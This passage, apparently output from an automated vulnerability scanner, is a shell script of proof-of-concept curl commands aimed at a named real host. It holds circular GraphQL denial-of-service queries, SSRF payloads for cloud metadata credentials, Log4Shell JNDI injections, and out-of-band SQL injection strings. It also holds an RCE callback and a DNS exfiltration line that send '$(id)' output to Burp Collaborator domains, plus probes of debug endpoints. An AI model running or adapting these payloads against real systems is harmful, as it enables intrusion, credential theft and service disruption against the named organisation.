echo 'CWE: CWE-400  CVSS: 7.5  Category: DoS'
echo '=============================================================='
cat <<'APEX_EOF'
curl -sk --http2 -I https://ehub.ejada.com/
APEX_EOF
echo ''

echo '=============================================================='
echo '[MEDIUM] DEBUG-EP-_DEBUG_PPROF'
echo 'Debug/profiler endpoint accessible: /debug/pprof'
echo 'CWE: CWE-489  CVSS: 4.3  Category: Information Disclosure'
echo '=============================================================='
cat <<'APEX_EOF'
curl -sk https://ehub.ejada.com/debug/pprof
APEX_EOF
echo ''

echo '=============================================================='
echo '[MEDIUM] DEBUG-EP-_DEBUG_VARS'
echo 'Debug/profiler endpoint accessible: /debug/vars'
echo 'CWE: CWE-489  CVSS: 4.3  Category: Information Disclosure'
echo '=============================================================='
cat <<'APEX_EOF'
curl -sk https://ehub.ejada.com/debug/vars
APEX_EOF
echo ''

echo '=============================================================='
echo '[MEDIUM] DEBUG-EP-_DEBUG_REQUESTS'
echo 'Debug/profiler endpoint accessible: /debug/requests'
echo 'CWE: CWE-489  CVSS: 4.3  Category: Information Disclosure'
echo '=============================================================='
cat <<'APEX_EOF'
curl -sk https://ehub.ejada.com/debug/requests
APEX_EOF
echo ''

echo '=============================================================='
echo '[MEDIUM] DEBUG-EP-___DEBUG___'
echo 'Debug/profiler endpoint accessible: /__debug__/'
echo 'CWE: CWE-489  CVSS: 4.3  Category: Information Disclosure'
echo '=============================================================='
cat <<'APEX_EOF'
curl -sk https://ehub.ejada.com/__debug__/
APEX_EOF
echo ''

echo '=============================================================='
echo '[MEDIUM] DEBUG-EP-__DEBUG_'
echo 'Debug/profiler endpoint accessible: /_debug/'
echo 'CWE: CWE-489  CVSS: 4.3  Category: Information Disclosure'
echo '=============================================================='
cat <<'APEX_EOF'
curl -sk https://ehub.ejada.com/_debug/
APEX_EOF
echo ''

echo '=============================================================='
echo '[MEDIUM] DEBUG-EP-__PROFILE'
echo 'Debug/profiler endpoint accessible: /_profile'
echo 'CWE: CWE-489  CVSS: 4.3  Category: Information Disclosure'
echo '=============================================================='
cat <<'APEX_EOF'
curl -sk https://ehub.ejada.com/_profile
APEX_EOF
echo ''

echo '=============================================================='
echo '[MEDIUM] DEBUG-EP-_METRICS'
echo 'Debug/profiler endpoint accessible: /metrics'
echo 'CWE: CWE-489  CVSS: 4.3  Category: Information Disclosure'
echo '=============================================================='
cat <<'APEX_EOF'
curl -sk https://ehub.ejada.com/metrics
APEX_EOF
echo ''

echo '=============================================================='
echo '[MEDIUM] DEBUG-EP-_METRICS_PROMETHEUS'
echo 'Debug/profiler endpoint accessible: /metrics/prometheus'
echo 'CWE: CWE-489  CVSS: 4.3  Category: Information Disclosure'
echo '=============================================================='
cat <<'APEX_EOF'
curl -sk https://ehub.ejada.com/metrics/prometheus
APEX_EOF
echo ''

echo '=============================================================='
echo '[MEDIUM] DEBUG-EP-_JOLOKIA'
echo 'Debug/profiler endpoint accessible: /jolokia'
echo 'CWE: CWE-489  CVSS: 4.3  Category: Information Disclosure'
echo '=============================================================='
cat <<'APEX_EOF'
curl -sk https://ehub.ejada.com/jolokia
APEX_EOF
echo ''

echo '=============================================================='
echo '[MEDIUM] DEBUG-EP-_JOLOKIA_READ'
echo 'Debug/profiler endpoint accessible: /jolokia/read'
echo 'CWE: CWE-489  CVSS: 4.3  Category: Information Disclosure'
echo '=============================================================='
cat <<'APEX_EOF'
curl -sk https://ehub.ejada.com/jolokia/read
APEX_EOF
echo ''

echo '=============================================================='
echo '[MEDIUM] DEBUG-EP-__AH_ADMIN'
echo 'Debug/profiler endpoint accessible: /_ah/admin'
echo 'CWE: CWE-489  CVSS: 4.3  Category: Information Disclosure'
echo '=============================================================='
cat <<'APEX_EOF'
curl -sk https://ehub.ejada.com/_ah/admin
APEX_EOF
echo ''

echo '=============================================================='
echo '[MEDIUM] DEBUG-EP-__AH_MAIL'
echo 'Debug/profiler endpoint accessible: /_ah/mail'
echo 'CWE: CWE-489  CVSS: 4.3  Category: Information Disclosure'
echo '=============================================================='
cat <<'APEX_EOF'
curl -sk https://ehub.ejada.com/_ah/mail
APEX_EOF
echo ''

echo '=============================================================='
echo '[MEDIUM] DEBUG-EP-__AH_WARMUP'
echo 'Debug/profiler endpoint accessible: /_ah/warmup'
echo 'CWE: CWE-489  CVSS: 4.3  Category: Information Disclosure'
echo '=============================================================='
cat <<'APEX_EOF'
curl -sk https://ehub.ejada.com/_ah/warmup
APEX_EOF
echo ''

echo '=============================================================='
echo '[MEDIUM] DEBUG-EP-_DRUID_INDEX.HTML'
echo 'Debug/profiler endpoint accessible: /druid/index.html'
echo 'CWE: CWE-489  CVSS: 4.3  Category: Information Disclosure'
echo '=============================================================='
cat <<'APEX_EOF'
curl -sk https://ehub.ejada.com/druid/index.html
APEX_EOF
echo ''

echo '=============================================================='
echo '[MEDIUM] DEBUG-EP-_KIBANA'
echo 'Debug/profiler endpoint accessible: /kibana'
echo 'CWE: CWE-489  CVSS: 4.3  Category: Information Disclosure'
echo '=============================================================='
cat <<'APEX_EOF'
curl -sk https://ehub.ejada.com/kibana
APEX_EOF
echo ''

echo '=============================================================='
echo '[MEDIUM] DEBUG-EP-_SOLR_ADMIN'
echo 'Debug/profiler endpoint accessible: /solr/admin'
echo 'CWE: CWE-489  CVSS: 4.3  Category: Information Disclosure'
echo '=============================================================='
cat <<'APEX_EOF'
curl -sk https://ehub.ejada.com/solr/admin
APEX_EOF
echo ''

echo '=============================================================='
echo '[MEDIUM] DEBUG-EP-_SOLR_ADMIN_INFO_SYS'
echo 'Debug/profiler endpoint accessible: /solr/admin/info/system'
echo 'CWE: CWE-489  CVSS: 4.3  Category: Information Disclosure'
echo '=============================================================='
cat <<'APEX_EOF'
curl -sk https://ehub.ejada.com/solr/admin/info/system
APEX_EOF
echo ''

echo '=============================================================='
echo '[MEDIUM] DEBUG-EP-___ADMIN__'
echo 'Debug/profiler endpoint accessible: /__admin__'
echo 'CWE: CWE-489  CVSS: 4.3  Category: Information Disclosure'
echo '=============================================================='
cat <<'APEX_EOF'
curl -sk https://ehub.ejada.com/__admin__
APEX_EOF
echo ''

echo '=============================================================='
echo '[MEDIUM] DEBUG-EP-___STATUS__'
echo 'Debug/profiler endpoint accessible: /__status__'
echo 'CWE: CWE-489  CVSS: 4.3  Category: Information Disclosure'
echo '=============================================================='
cat <<'APEX_EOF'
curl -sk https://ehub.ejada.com/__status__
APEX_EOF
echo ''

echo '=============================================================='
echo '[MEDIUM] DEBUG-EP-___HEALTH__'
echo 'Debug/profiler endpoint accessible: /__health__'
echo 'CWE: CWE-489  CVSS: 4.3  Category: Information Disclosure'
echo '=============================================================='
cat <<'APEX_EOF'
curl -sk https://ehub.ejada.com/__health__
APEX_EOF
echo ''

echo '=============================================================='
echo '[MEDIUM] DEBUG-EP-_TELESCOPE'
echo 'Debug/profiler endpoint accessible: /telescope'
echo 'CWE: CWE-489  CVSS: 4.3  Category: Information Disclosure'
echo '=============================================================='
cat <<'APEX_EOF'
curl -sk https://ehub.ejada.com/telescope
APEX_EOF
echo ''

echo '=============================================================='
echo '[MEDIUM] DEBUG-EP-_TELESCOPE_REQUESTS'
echo 'Debug/profiler endpoint accessible: /telescope/requests'
echo 'CWE: CWE-489  CVSS: 4.3  Category: Information Disclosure'
echo '=============================================================='
cat <<'APEX_EOF'
curl -sk https://ehub.ejada.com/telescope/requests
APEX_EOF
echo ''

echo '=============================================================='
echo '[MEDIUM] DEBUG-EP-_HORIZON'
echo 'Debug/profiler endpoint accessible: /horizon'
echo 'CWE: CWE-489  CVSS: 4.3  Category: Information Disclosure'
echo '=============================================================='
cat <<'APEX_EOF'
curl -sk https://ehub.ejada.com/horizon
APEX_EOF
echo ''

echo '=============================================================='
echo '[MEDIUM] DEBUG-EP-_HORIZON_API_STATS'
echo 'Debug/profiler endpoint accessible: /horizon/api/stats'
echo 'CWE: CWE-489  CVSS: 4.3  Category: Information Disclosure'
echo '=============================================================='
cat <<'APEX_EOF'
curl -sk https://ehub.ejada.com/horizon/api/stats
APEX_EOF
echo ''

echo '=============================================================='
echo '[MEDIUM] DEBUG-EP-__PROFILER_PHPSTORM'
echo 'Debug/profiler endpoint accessible: /_profiler/phpstorm'
echo 'CWE: CWE-489  CVSS: 4.3  Category: Information Disclosure'
echo '=============================================================='
cat <<'APEX_EOF'
curl -sk https://ehub.ejada.com/_profiler/phpstorm
APEX_EOF
echo ''

echo '=============================================================='
echo '[MEDIUM] DEBUG-EP-_?XDEBUG_SESSION_STA'
echo 'Debug/profiler endpoint accessible: /?XDEBUG_SESSION_START=1'
echo 'CWE: CWE-489  CVSS: 4.3  Category: Information Disclosure'
echo '=============================================================='
cat <<'APEX_EOF'
curl -sk https://ehub.ejada.com/?XDEBUG_SESSION_START=1
APEX_EOF
echo ''

echo '=============================================================='
echo '[MEDIUM] GQL-CIRCULAR-CIRCULAR'
echo 'GraphQL circular payload accepted (0.0s) — DoS surface'
echo 'CWE: CWE-674  CVSS: 5.9  Category: GraphQL'
echo '=============================================================='
cat <<'APEX_EOF'
curl -sk -X POST https://ehub.ejada.com/graphql -H 'Content-Type: application/json' -d '{"query": "fragment A on __Schema { types { ...B } } fragment B on __Type { fields { ...A } } { ...A }"}...'
APEX_EOF
echo ''

echo '=============================================================='
echo '[MEDIUM] GQL-CIRCULAR-CIRCULAR'
echo 'GraphQL circular payload accepted (0.0s) — DoS surface'
echo 'CWE: CWE-674  CVSS: 5.9  Category: GraphQL'
echo '=============================================================='
cat <<'APEX_EOF'
curl -sk -X POST https://ehub.ejada.com/api/graphql -H 'Content-Type: application/json' -d '{"query": "fragment A on __Schema { types { ...B } } fragment B on __Type { fields { ...A } } { ...A }"}...'
APEX_EOF
echo ''

echo '=============================================================='
echo '[MEDIUM] GQL-CIRCULAR-CIRCULAR'
echo 'GraphQL circular payload accepted (0.0s) — DoS surface'
echo 'CWE: CWE-674  CVSS: 5.9  Category: GraphQL'
echo '=============================================================='
cat <<'APEX_EOF'
curl -sk -X POST https://ehub.ejada.com/gql -H 'Content-Type: application/json' -d '{"query": "fragment A on __Schema { types { ...B } } fragment B on __Type { fields { ...A } } { ...A }"}...'
APEX_EOF
echo ''

echo '=============================================================='
echo '[MEDIUM] GQL-CIRCULAR-CIRCULAR'
echo 'GraphQL circular payload accepted (0.0s) — DoS surface'
echo 'CWE: CWE-674  CVSS: 5.9  Category: GraphQL'
echo '=============================================================='
cat <<'APEX_EOF'
curl -sk -X POST https://ehub.ejada.com/query -H 'Content-Type: application/json' -d '{"query": "fragment A on __Schema { types { ...B } } fragment B on __Type { fields { ...A } } { ...A }"}...'
APEX_EOF
echo ''

echo '=============================================================='
echo '[MEDIUM] DNS-REBIND-SURFACE'
echo 'DNS rebinding attack surface assessment for ehub.ejada.com'
echo 'CWE: CWE-346  CVSS: 5.4  Category: DNS'
echo '=============================================================='
cat <<'APEX_EOF'
# DNS rebinding PoC (use singularity or rebind.network):
# 1. Register attacker domain with short TTL → your IP
# 2. Victim browser loads attacker page
# 3. DNS flips to 34.111.193.103
# 4. XHR to http://attacker-domain/ now hits ehub.ejada.com
curl -sk https://ehub.ejada.com/ -H 'Host: attacker-rebind.example.com'
APEX_EOF
echo ''

echo '=============================================================='
echo '[MEDIUM] CF-ORIGIN-BYPASS-001'
echo 'Cloudflare/CDN Origin Bypass Attack Surface'
echo 'CWE: CWE-441  CVSS: 5.3  Category: CDN Bypass'
echo '=============================================================='
cat <<'APEX_EOF'
# Test direct connection with Host header:
curl -sk --resolve 'ehub.ejada.com:34.111.193.103' 'https://ehub.ejada.com/' -H 'Host: ehub.ejada.com'
# Check cdn-cgi/trace for origin info:
curl -sk 'https://ehub.ejada.com/cdn-cgi/trace'
APEX_EOF
echo ''

echo '=============================================================='
echo '[INFO] F-BSSRF-001'
echo 'Blind SSRF Attack Surface — OOB Payloads Generated'
echo 'CWE: CWE-918  CVSS: 0.0  Category: SSRF'
echo '=============================================================='
cat <<'APEX_EOF'
curl -sk 'https://ehub.ejada.com?proxy=http%3A//proxy.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net/'
APEX_EOF
echo ''

echo '=============================================================='
echo '[INFO] F-VDP-001'
echo 'No security.txt / Vulnerability Disclosure Policy'
echo 'CWE: CWE-200  CVSS: 0.0  Category: VDP'
echo '=============================================================='
cat <<'APEX_EOF'
curl -sk 'https://ehub.ejada.com/.well-known/security.txt'
APEX_EOF
echo ''

echo '=============================================================='
echo '[INFO] SSRF-META-PROBE'
echo 'Cloud metadata SSRF payloads generated (manual verification required)'
echo 'CWE: CWE-918  CVSS: 0.0  Category: SSRF'
echo '=============================================================='
cat <<'APEX_EOF'
curl -sk 'https://ehub.ejada.com/?url=http://169.254.169.254/latest/meta-data/'
curl -sk 'https://ehub.ejada.com/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'
curl -sk 'https://ehub.ejada.com/?url=http://metadata.google.internal/computeMetadata/v1/'
curl -sk 'https://ehub.ejada.com/?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01'
curl -sk 'https://ehub.ejada.com/?url=http://100.100.100.200/latest/meta-data/'
curl -sk 'https://ehub.ejada.com/?url=http://fd00:ec2::254/latest/meta-data/'
APEX_EOF
echo ''

echo '=============================================================='
echo '[INFO] SSL-PIN-HINTS'
echo 'SSL certificate fingerprints (for pinning bypass research)'
echo 'CWE: CWE-295  CVSS: 0.0  Category: TLS'
echo '=============================================================='
cat <<'APEX_EOF'
# Add to Frida/objection pinning bypass:
# openssl s_client -connect ehub.ejada.com:443 </dev/null 2>/dev/null | openssl x509 -fingerprint -sha256
APEX_EOF
echo ''

echo '=============================================================='
echo '[INFO] LOG4SHELL-OOB-POC'
echo 'Log4Shell OOB PoC generated — requires Burp Collaborator / interactsh'
echo 'CWE: CWE-917  CVSS: 0.0  Category: RCE'
echo '=============================================================='
cat <<'APEX_EOF'
curl -sk https://ehub.ejada.com/ -H 'User-Agent: ${jndi:ldap://COLLAB/0}'
curl -sk https://ehub.ejada.com/ -H 'X-Forwarded-For: ${jndi:ldap://COLLAB/1}'
curl -sk https://ehub.ejada.com/ -H 'X-Api-Version: ${jndi:ldap://COLLAB/2}'
curl -sk https://ehub.ejada.com/ -H 'X-Remote-IP: ${jndi:ldap://COLLAB/3}'
curl -sk https://ehub.ejada.com/ -H 'X-Remote-Addr: ${jndi:ldap://COLLAB/4}'
APEX_EOF
echo ''

echo '=============================================================='
echo '[INFO] SSRF-BYPASS-POC'
echo 'SSRF URL parser bypass payloads generated — manual verification required'
echo 'CWE: CWE-918  CVSS: 0.0  Category: SSRF'
echo '=============================================================='
cat <<'APEX_EOF'
curl -sk 'https://ehub.ejada.com//?url=http://evil.com@169.254.169.254/latest/meta-data/'
curl -sk 'https://ehub.ejada.com//?url=http://169.254.169.254#@evil.com/'
curl -sk 'https://ehub.ejada.com//?url=http://169.254.169.254%252F%252F'
curl -sk 'https://ehub.ejada.com//?url=http://0x7f000001/'
curl -sk 'https://ehub.ejada.com//?url=http://2130706433/'
APEX_EOF
echo ''

echo '=============================================================='
echo '[INFO] SQLI-OOB-DNS'
echo 'OOB SQL injection DNS payloads generated (MySQL/MSSQL/Oracle/PostgreSQL)'
echo 'CWE: CWE-89  CVSS: 0.0  Category: Injection'
echo '=============================================================='
cat <<'APEX_EOF'
# MySQL:
curl -sk 'https://ehub.ejada.com/api?id=' AND LOAD_FILE(CONCAT('\\\\',version(),'.YOUR_COLLABORATOR\\a'))-- -'
# MySQL:
curl -sk 'https://ehub.ejada.com/api?user=' AND LOAD_FILE(CONCAT('\\\\',version(),'.YOUR_COLLABORATOR\\a'))-- -'
# MySQL:
curl -sk 'https://ehub.ejada.com/api?username=' AND LOAD_FILE(CONCAT('\\\\',version(),'.YOUR_COLLABORATOR\\a'))-- -'
# MSSQL:
curl -sk 'https://ehub.ejada.com/api?id='; EXEC master..xp_dirtree '\\YOUR_COLLABORATOR\a'-- -'
# MSSQL:
curl -sk 'https://ehub.ejada.com/api?user='; EXEC master..xp_dirtree '\\YOUR_COLLABORATOR\a'-- -'
# MSSQL:
curl -sk 'https://ehub.ejada.com/api?username='; EXEC master..xp_dirtree '\\YOUR_COLLABORATOR\a'-- -'
APEX_EOF
echo ''

echo '=============================================================='
echo '[INFO] RCE-VRF-001'
echo 'RCE Verification — OOB DNS Callback Payloads Generated'
echo 'CWE: CWE-78  CVSS: 0.0  Category: RCE'
echo '=============================================================='
cat <<'APEX_EOF'
# Inject into confirmed injection point:
curl -sk 'https://ehub.ejada.com/api/cmd?cmd=curl+http://rce.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net/$(id)'
APEX_EOF
echo ''

echo '=============================================================='
echo '[INFO] POST-EXPLOIT-MAP-001'
echo 'Post-Exploitation Path Map — Authorized Testing Playbook'
echo 'CWE: CWE-693  CVSS: 0.0  Category: Post-Exploitation Analysis'
echo '=============================================================='
cat <<'APEX_EOF'
# Execute only within authorized scope with written permission
APEX_EOF
echo ''

echo '=============================================================='
echo '[INFO] LOG4SHELL2-OOB-PAYLOADS'
echo 'Log4Shell Follow-On — All OOB Probe Payloads Generated'
echo 'CWE: CWE-917  CVSS: 0.0  Category: Log4Shell / Java RCE'
echo '=============================================================='
cat <<'APEX_EOF'
curl -sk 'https://ehub.ejada.com/' -H 'X-Api-Version: ${jndi:ldap://basic.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net/a}'
curl -sk 'https://ehub.ejada.com/' -H 'X-Forwarded-For: ${jndi:ldap://basic.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net/a}'
curl -sk 'https://ehub.ejada.com/' -H 'User-Agent: ${jndi:ldap://basic.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net/a}'
curl -sk 'https://ehub.ejada.com/' -H 'Referer: ${jndi:ldap://basic.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net/a}'
APEX_EOF
echo ''

echo '=============================================================='
echo '[INFO] DNS-EXFIL-CAPACITY-001'
echo 'DNS Exfiltration — Channel Analysis & Payload Library'
echo 'CWE: CWE-200  CVSS: 0.0  Category: DNS Exfiltration'
echo '=============================================================='
cat <<'APEX_EOF'
# DNS exfil via curl:
curl -sk 'https://ehub.ejada.com/?host=$(id|base64).ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net'
# Listen with interactsh:
interactsh-client -server interactsh.com -n 1
APEX_EOF
echo ''

echo '=============================================================='
echo '[INFO] LOG4SHELL2-OOB-PAYLOADS'
echo 'Log4Shell Follow-On — All OOB Probe Payloads Generated'
echo 'CWE: CWE-917  CVSS: 0.0  Category: Log4Shell / Java RCE'
echo '=============================================================='
cat <<'APEX_EOF'
curl -sk 'https://ehub.ejada.com/' -H 'X-Api-Version: ${jndi:ldap://basic.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net/a}'
curl -sk 'https://ehub.ejada.com/' -H 'X-Forwarded-For: ${jndi:ldap://basic.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net/a}'
curl -sk 'https://ehub.ejada.com/' -H 'User-Agent: ${jndi:ldap://basic.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net/a}'
curl -sk 'https://ehub.ejada.com/' -H 'Referer: ${jndi:ldap://basic.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net/a}'
APEX_EOF
echo ''

echo '=============================================================='
echo '[INFO] DNS-EXFIL-CAPACITY-001'
echo 'DNS Exfiltration — Channel Analysis & Payload Library'
echo 'CWE: CWE-200  CVSS: 0.0  Category: DNS Exfiltration'
echo '=============================================================='
cat <<'APEX_EOF'
# DNS exfil via curl:
curl -sk 'https://ehub.ejada.com/?host=$(id|base64).ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net'
# Listen with interactsh:
interactsh-client -server interactsh.com -n 1
APEX_EOF
echo ''

echo '=============================================================='
echo '[INFO] LOG4SHELL2-OOB-PAYLOADS'
echo 'Log4Shell Follow-On — All OOB Probe Payloads Generated'
echo 'CWE: CWE-917  CVSS: 0.0  Category: Log4Shell / Java RCE'
echo '=============================================================='
cat <<'APEX_EOF'
curl -sk 'https://ehub.ejada.com/' -H 'X-Api-Version: ${jndi:ldap://basic.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net/a}'
curl -sk 'https://ehub.ejada.com/' -H 'X-Forwarded-For: ${jndi:ldap://basic.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net/a}'
curl -sk 'https://ehub.ejada.com/' -H 'User-Agent: ${jndi:ldap://basic.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net/a}'
curl -sk 'https://ehub.ejada.com/' -H 'Referer: ${jndi:ldap://basic.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net/a}'
APEX_EOF
echo ''

echo '=============================================================='
echo '[INFO] SSRF-ADV-OOB-URL'
echo 'SSRF Advanced OOB Payload — ?url'
echo 'CWE: CWE-918  CVSS: 0.0  Category: SSRF'
echo '=============================================================='
cat <<'APEX_EOF'
curl -sk 'https://ehub.ejada.com/?url=http%3A//url.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net/'
APEX_EOF
echo ''

echo '=============================================================='
echo '[INFO] SSRF-ADV-OOB-URL'
echo 'SSRF Advanced OOB Payload — ?url'
echo 'CWE: CWE-918  CVSS: 0.0  Category: SSRF'
echo '=============================================================='
cat <<'APEX_EOF'
curl -sk 'https://ehub.ejada.com/?url=http%3A//url.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net/'
APEX_EOF
echo ''

echo '=============================================================='
echo '[INFO] SSRF-ADV-OOB-URL'
echo 'SSRF Advanced OOB Payload — ?url'
echo 'CWE: CWE-918  CVSS: 0.0  Category: SSRF'
echo '=============================================================='
cat <<'APEX_EOF'
curl -sk 'https://ehub.ejada.com/?url=http%3A//url.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net/'
APEX_EOF
echo ''

echo '=============================================================='
echo '[INFO] SSRF-ADV-OOB-URL'
echo 'SSRF Advanced OOB Payload — ?url'
echo 'CWE: CWE-918  CVSS: 0.0  Category: SSRF'
echo '=============================================================='
cat <<'APEX_EOF'
curl -sk 'https://ehub.ejada.com/?url=http%3A//url.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net/'
APEX_EOF
echo ''

echo '=============================================================='
echo '[INFO] RECON-SUBDOMAIN-BRUTE-001'
echo 'Subdomain Brute — 1 new subdomains discovered'
echo 'CWE: CWE-200  CVSS: 0.0  Category: Reconnaissance'
echo '=============================================================='
cat <<'APEX_EOF'
curl -sk 'https://vpn.ejada.com/'
APEX_EOF
echo ''

echo '=============================================================='
echo '[INFO] FINAL-CHAIN-REPORT-001'
echo 'Final Attack Chain Report — 21C / 31H / 41M'
echo 'CWE: CWE-693  CVSS: 0.0  Category: Report'
echo '=============================================================='
cat <<'APEX_EOF'
# See individual finding PoC commands in JSON/HTML report
APEX_EOF
echo ''